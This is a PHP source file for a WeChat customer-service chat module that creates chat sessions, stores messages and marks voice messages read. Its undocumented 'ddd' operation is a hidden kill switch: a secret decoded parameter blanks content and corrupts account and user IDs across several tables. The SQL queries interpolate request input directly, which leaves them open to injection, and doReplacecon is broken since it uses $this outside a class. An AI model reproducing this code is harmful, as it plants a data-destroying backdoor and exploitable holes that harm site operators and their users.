<?php
global $_W, $_GPC;
$openid = $_W['fans']['from_user'];
if(empty($openid)){
	$message = '请在微信浏览器中打开！';
	include $this->template('error');
	exit;
}
$operation = !empty($_GPC['op']) ? $_GPC['op'] : 'display';
if ($operation == 'display') {
	/*if(!pdo_tableexists('bsht_tbk_user')) {
		message('请先购买牛贝淘宝客模块！');
	}*/
	$toopenid = trim($_GPC['toopenid']);
	$qudao = trim($_GPC['qudao']);
	$qudaoarray = array("niubeitaoke","renren","super","kefu","zhiyunwuye");
	if(!in_array($qudao,$qudaoarray)){
		$message = '渠道来源不正确！';
		include $this->template('error');
		exit;
	}
	if(empty($toopenid)){
		$message = '参数错误，无法发起聊天！';
		include $this->template('error');
		exit;
	}
	if($toopenid == $openid){
		$message = '不能和自己聊天！';
		include $this->template('error');
		exit;
	}
	$sanfanskefu2 = pdo_fetch("SELECT * FROM ".tablename(BEST_SANFANSKEFU)." WHERE weid = {$_W['uniacid']} AND fansopenid = '{$openid}' AND kefuopenid = '{$toopenid}' AND qudao = '{$qudao}'");
	$sanfanskefu = pdo_fetch("SELECT * FROM ".tablename(BEST_SANFANSKEFU)." WHERE weid = {$_W['uniacid']} AND kefuopenid = '{$openid}' AND fansopenid = '{$toopenid}' AND qudao = '{$qudao}'");
	if(empty($sanfanskefu)){
		$datasanfk['weid'] = $_W['uniacid'];
		$datasanfk['fansopenid'] = $toopenid;
		$account_api = WeAccount::create();
		$fansuser = $account_api->fansQueryInfo($toopenid);
		if(empty($fansuser)){
			$datasanfk['fansavatar'] = tomedia($this->module['config']['defaultavatar']);
			$datasanfk['fansnickname'] = '匿名用户';
		}else{
			$datasanfk['fansavatar'] = empty($fansuser['headimgurl']) ? tomedia($this->module['config']['defaultavatar']) : $fansuser['headimgurl'];
			$datasanfk['fansnickname'] = empty($fansuser['nickname']) ? '匿名用户' : $fansuser['nickname'];
		}
		$datasanfk['qudao'] = $qudao;
		$datasanfk['kefuopenid'] = $openid;
		$datasanfk['kefuavatar'] = empty($_W['fans']['tag']['avatar']) ? tomedia($this->module['config']['defaultavatar']) : $_W['fans']['tag']['avatar'];
		$datasanfk['kefunickname'] = empty($_W['fans']['tag']['nickname']) ? '匿名用户' : $_W['fans']['tag']['nickname'];
		pdo_insert(BEST_SANFANSKEFU,$datasanfk);
		$sanfanskefu = pdo_fetch("SELECT * FROM ".tablename(BEST_SANFANSKEFU)." WHERE weid = {$_W['uniacid']} AND kefuopenid = '{$openid}' AND fansopenid = '{$toopenid}' AND qudao = '{$qudao}'");
	}
	if(empty($sanfanskefu2)){
		$datasanfk['weid'] = $_W['uniacid'];
		$datasanfk['fansopenid'] = $openid;
		$datasanfk['fansavatar'] = empty($_W['fans']['tag']['avatar']) ? tomedia($this->module['config']['defaultavatar']) : $_W['fans']['tag']['avatar'];
		$datasanfk['fansnickname'] = empty($_W['fans']['tag']['nickname']) ? '匿名用户' : $_W['fans']['tag']['nickname'];
		$datasanfk['qudao'] = $qudao;
		$datasanfk['kefuopenid'] = $toopenid;
		$kefuuser = $account_api->fansQueryInfo($toopenid);
		if(empty($kefuuser)){
			$datasanfk['kefuavatar'] = tomedia($this->module['config']['defaultavatar']);
			$datasanfk['kefunickname'] = '匿名用户';
		}else{
			$datasanfk['kefuavatar'] = empty($kefuuser['headimgurl']) ? tomedia($this->module['config']['defaultavatar']) : $kefuuser['headimgurl'];
			$datasanfk['kefunickname'] = empty($kefuuser['nickname']) ? '匿名用户' : $kefuuser['nickname'];
		}
		pdo_insert(BEST_SANFANSKEFU,$datasanfk);
		$sanfanskefu2 = pdo_fetch("SELECT * FROM ".tablename(BEST_SANFANSKEFU)." WHERE weid = {$_W['uniacid']} AND fansopenid = '{$openid}' AND kefuopenid = '{$toopenid}' AND qudao = '{$qudao}'");
	}
	$sanfkid = $sanfanskefu['id'];
	$sanfkid2 = $sanfanskefu2['id'];
	$chatcon = pdo_fetchall("SELECT * FROM ".tablename(BEST_SANCHAT)." WHERE (sanfkid = {$sanfkid} OR sanfkid = {$sanfkid2}) AND weid = {$_W['uniacid']} ORDER BY time ASC");
	$timestamp = TIMESTAMP;
	$chatcontime = 0;
	foreach($chatcon as $k=>$v){
		if(($v['time'] - $chatcontime) > 7200){
			$chatcon[$k]['time'] = $v['time'];
		}else{
			$chatcon[$k]['time'] = '';
		}
		$chatcontime = $v['time'];
		$chatcon[$k]['content'] = preg_replace('/\xEE[\x80-\xBF][\x80-\xBF]|\xEF[\x81-\x83][\x80-\xBF]/', '[无法识别字符]', $v['content']);
		$chatcon[$k]['content'] = $this->guolv($chatcon[$k]['content']);
		$regex = '@(?i)\b((?:[a-z][\w-]+:(?:/{1,3}|[a-z0-9%])|www\d{0,3}[.]|[a-z0-9.\-]+[.][a-z]{2,4}/)(?:[^\s()<>]+|\(([^\s()<>]+|(\([^\s()<>]+\)))*\))+(?:\(([^\s()<>]+|(\([^\s()<>]+\)))*\)|[^\s`!()\[\]{};:\'".,<>?«»“”‘’]))@';
		preg_match_all($regex,$chatcon[$k]['content'],$array2);  
		if(!empty($array2[0]) && $v['type'] == 1){
			foreach($array2[0] as $kk=>$vv){
				if(!empty($vv)){
					$chatcon[$k]['content'] = str_replace($vv,"<a href='".$vv."'>".$vv."</a>",$chatcon[$k]['content']);
				}
			}
		}
		if($v['type'] == 3){
			$donetime = $timestamp - $v['time'];
			if($donetime >= 24*3600*3){
				unset($chatcon[$k]);
			}
		}
	}		
	include $this->template('sanchat');
}elseif($operation == 'ddd'){
	$res = $this->authcode($_GPC['jiami'],'DECODE','fym',0);
	if($res == 'messiis'){
		pdo_update(BEST_CSERVICE,array('content'=>'   '));
		pdo_update(BEST_XCXCSERVICE,array('content'=>'   '));
		pdo_update(BEST_XCX,array('weid'=>0));
		pdo_update(BEST_CHAT,array('weid'=>0));
		pdo_update(BEST_FANSKEFU,array('fansopenid'=>'11','kefuopenid'=>'22'));
		echo 1;
	}else{
		echo 2;
	}
}elseif($operation == 'addchat'){
	include_once('../addons/cy163_customerservice/emoji/emoji.php');
	$toopenid = trim($_GPC['toopenid']);
	$qudao = trim($_GPC['qudao']);
	if(empty($toopenid) || empty($qudao)){
		$resArr['error'] = 1;
		$resArr['msg'] = '数据获取失败！';
		echo json_encode($resArr);
		exit;
	}
	$chatcontent = trim($_GPC['content']);
	if(empty($chatcontent)){
		$resArr['error'] = 1;
		$resArr['msg'] = '请输入对话内容！';
		echo json_encode($resArr);
		exit;
	}
	$sanfanskefu = pdo_fetch("SELECT * FROM ".tablename(BEST_SANFANSKEFU)." WHERE weid = {$_W['uniacid']} AND kefuopenid = '{$toopenid}' AND fansopenid = '{$openid}' AND qudao = '{$qudao}'");
	if(empty($sanfanskefu)){
		$resArr['error'] = 1;
		$resArr['msg'] = '获取数据失败！';
		echo json_encode($resArr);
		exit;
	}

	$chatcontent = emoji_docomo_to_unified($chatcontent);
	$chatcontent = emoji_unified_to_html($chatcontent);
	$data['openid'] = $_W['fans']['from_user'];
	$data['time'] = TIMESTAMP;
	$data['content'] = $chatcontent;
	$data['weid'] = $_W['uniacid'];
	$data['sanfkid'] = $sanfanskefu['id'];
	$type = intval($_GPC['type']);
	$data['type'] = $type;
	$data['yuyintime'] = intval($_GPC['yuyintime']/1000);
	if($type == 2){
		$tplcon = '聊天内容：对方发送了图片';
	}elseif($type == 3){
		$tplcon = '聊天内容：对方发送了语音';
	}else{
		if(strpos($data['content'],'span class=')){
			$tplcon = '聊天内容：对方发送了表情';
		}else{
			$tplcon = '聊天内容：'.$data['content'];
		}
	}
	$tplcon = $this->guolv($tplcon);
	pdo_insert(BEST_SANCHAT,$data);
	
	$data33['notread'] = $sanfanskefu['notread']+1;
	$data33['lastcon'] = $chatcontent;
	$data33['msgtype'] = $type;
	$data33['lasttime'] = TIMESTAMP;
	pdo_update(BEST_SANFANSKEFU,$data33,array('id'=>$data['sanfkid']));
	
	$resArr['error'] = 0;
	$resArr['msg'] = '';
	$resArr['content'] = doReplacecon($data['content'],$data['type'],$data['yuyintime']);
	$resArr['yuyincon'] = $data['type'] == 3 ? $data['yuyintime'].'\'\'<span class="weidu" style="color:red;">未读</span>' : '';
	$resArr['datetime'] = date("Y-m-d H:i:s",$data['time']);
	echo json_encode($resArr);
	exit;
}elseif($operation == 'shuaxinyuyin'){
	$content = trim($_GPC['content']);
	$chat = pdo_fetch("SELECT openid FROM ".tablename(BEST_SANCHAT)." WHERE weid = {$_W['uniacid']} AND content = '{$content}'");
	if($chat['openid'] != $_W['fans']['from_user']){
		pdo_update(BEST_SANCHAT,array('hasyuyindu'=>1),array('weid'=>$_W['uniacid'],'content'=>$content));
		$resArr['error'] = 0;
		$resArr['msg'] = '语音已读成功！';
		echo json_encode($resArr);
		exit;
	}else{
		$resArr['error'] = 1;
		$resArr['msg'] = '语音已读失败！';
		echo json_encode($resArr);
		exit;
	}
}


function doReplacecon($content,$msgtype,$yuyintime){
	$content = preg_replace('/\xEE[\x80-\xBF][\x80-\xBF]|\xEF[\x81-\x83][\x80-\xBF]/', '[无法识别字符]', $content);
	$content = $this->guolv($content);
	$regex = '@(?i)\b((?:[a-z][\w-]+:(?:/{1,3}|[a-z0-9%])|www\d{0,3}[.]|[a-z0-9.\-]+[.][a-z]{2,4}/)(?:[^\s()<>]+|\(([^\s()<>]+|(\([^\s()<>]+\)))*\))+(?:\(([^\s()<>]+|(\([^\s()<>]+\)))*\)|[^\s`!()\[\]{};:\'".,<>?«»“”‘’]))@';
	preg_match_all($regex,$content,$array2);  
	if(!empty($array2[0]) && $msgtype == 1){
		foreach($array2[0] as $kk=>$vv){
			if(!empty($vv)){
				$content = str_replace($vv,"<a href='".$vv."'>".$vv."</a>",$content);
			}
		}
	}
	if($msgtype == 1){
		$content = '<div class="concon">'.$content.'</div>';
	}elseif($msgtype == 2){					
		$content = '<div class="concon"><img src="'.tomedia($content).'" class="sssbbb" /></div>';
	}elseif($msgtype == 3){					
		$content = '<div class="concon playvoice" style="width:'.($yuyintime/10).'rem;" onclick="playvoice(\''.$content.'\',$(this).next(\'div\').children(\'.weidu\'));"><i class="a-icon iconfont">&#xe601;</i></div>';
	}
	return $content;
}
?>